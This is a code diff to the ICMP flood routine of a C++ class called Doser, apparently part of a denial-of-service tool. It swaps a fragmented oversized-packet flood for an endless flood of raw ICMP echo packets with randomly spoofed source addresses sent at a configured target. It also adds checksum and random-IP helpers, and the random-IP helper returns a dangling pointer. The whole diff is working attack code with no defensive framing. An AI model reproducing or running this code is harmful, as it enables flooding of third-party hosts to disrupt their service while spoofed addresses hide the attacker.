@@ -346,88 +346,110 @@ void Doser::cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx) {
 }
 
 void Doser::icmp_flood(const int *id) {
-    int s, x, offset, on = 1;
-    char buf[400];
     std::string message{};
-    // Structs
-    auto *ip = (struct ip *)buf;
-    auto *icmp = (struct icmphdr *)(ip + 1);
-    struct hostent *hp;
-    struct sockaddr_in dst{};
-
     while(true){
-        for(x = 0;x < conf->CONNECTIONS; x++){
-            bzero(buf, sizeof(buf));
-            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+        for(int x = 0; x < conf->CONNECTIONS; x++){
+            int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
+            if (sockfd < 0) {
                 logger->Log("socket() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+            int on = 1;
+
+            if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) < 0) {
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
-                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
-                    logger->Log("Can't resolve the host", Logger::Error);
-                    exit(EXIT_FAILURE);
-                }
-            }else{
-                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
-            }
-            std::string src{std::to_string(randomInt(1, 256))};
-            src += "."
-                   + std::to_string(randomInt(1, 256))
-                   + "."
-                   + std::to_string(randomInt(1, 256))
-                   + "."
-                   + std::to_string(randomInt(1, 256));
-
-            if((ip->ip_src.s_addr = inet_addr(src.c_str())) < 0){
-                logger->Log("Unable to set random src ip", Logger::Error);
+            if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) < 0) {
+                logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            // IP Struct
-            ip->ip_v = 4;
-            ip->ip_hl = sizeof*ip >> 2;
-            ip->ip_tos = 0;
-            ip->ip_len = htons(sizeof(buf));
-            ip->ip_id = htons(4321);
-            ip->ip_off = htons(0);
-            ip->ip_ttl = 255;
-            ip->ip_p = 1;
-            ip->ip_sum = 0;
+            size_t packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + 400;
+            auto *packet = (char *) malloc (packet_size);
+            if (!packet) {
+                logger->Log("memory error", Logger::Error);
+                close(sockfd);
+                exit(EXIT_FAILURE);
+            }
 
-            dst.sin_addr = ip->ip_dst;
-            dst.sin_family = AF_INET;
+            auto *ip = (struct iphdr *) packet;
+            auto *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
+
+            bzero(packet, packet_size);
+
+            ip->version = 4;
+            ip->ihl = 5;
+            ip->tos = 0;
+            ip->tot_len = htons (packet_size);
+            ip->id = static_cast<u_int16_t>(randomInt(1, 1000));
+            ip->frag_off = 0;
+            ip->ttl = 255;
+            ip->protocol = IPPROTO_ICMP;
+            ip->saddr = inet_addr(randomizeIP());
+            ip->daddr = inet_addr(conf->website.c_str());
+            //ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));
+
             icmp->type = ICMP_ECHO;
             icmp->code = 0;
-            icmp->checksum = htons(~(ICMP_ECHO << 8));
-            for(offset = 0; offset < 65536; offset += (sizeof(buf) - sizeof(*ip))){
-                ip->ip_off = htons(offset >> 3);
-                if(offset < 65120){
-                    ip->ip_off |= htons(0x2000);
-                }else{
-                    ip->ip_len = htons(418);
-                }
+            icmp->un.echo.sequence = static_cast<u_int16_t>(randomInt(1, 1000));
+            icmp->un.echo.id = static_cast<u_int16_t>(randomInt(1, 10000));
+            //checksum
+            icmp->checksum = 0;
 
-                if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
-                    logger->Log("sendto() error", Logger::Error);
-                }
+            struct sockaddr_in servaddr{};
+            servaddr.sin_family = AF_INET;
+            servaddr.sin_addr.s_addr = inet_addr(conf->website.c_str());
+            bzero(&servaddr.sin_zero, sizeof(servaddr.sin_zero));
+            memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), randomInt(1, 255), 72);
+            icmp->checksum = 0;
+            icmp->checksum = cksum((unsigned short *)icmp, sizeof(struct icmphdr) + 72);
 
-                if(offset == 0){
-                    icmp->type = 0;
-                    icmp->code = 0;
-                    icmp->checksum = 0;
-                }
+            if ( (sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) {
+                logger->Log("sendto() error", Logger::Error);
+                free(packet);
+                close(sockfd);
+                exit(EXIT_FAILURE);
             }
             message = std::to_string(*id) + ": Voly Sent";
             logger->Log(&message, Logger::Info);
-            close(s);
+            free(packet);
+            close(sockfd);
             usleep(30000);
         }
+
     }
 
+
+}
+
+unsigned short Doser::cksum(unsigned short *ptr, int nbytes) {
+    long checksum;
+    u_short oddbyte;
+    checksum = 0;
+    while (nbytes > 1) {
+        checksum += *ptr++;
+        nbytes -= 2;
+    }
+    if (nbytes == 1) {
+        oddbyte = 0;
+        *((u_char *) & oddbyte) = *(u_char *) ptr;
+        checksum += oddbyte;
+    }
+    checksum = (checksum >> 16) + (checksum & 0xffff);
+    checksum += (checksum >> 16);
+    return (static_cast<u_short>(~checksum));
+}
+
+const char *Doser::randomizeIP() {
+    std::string src{std::to_string(randomInt(1, 256))};
+    src += "."
+           + std::to_string(randomInt(1, 256))
+           + "."
+           + std::to_string(randomInt(1, 256))
+           + "."
+           + std::to_string(randomInt(1, 256));
+    return src.c_str();
 }
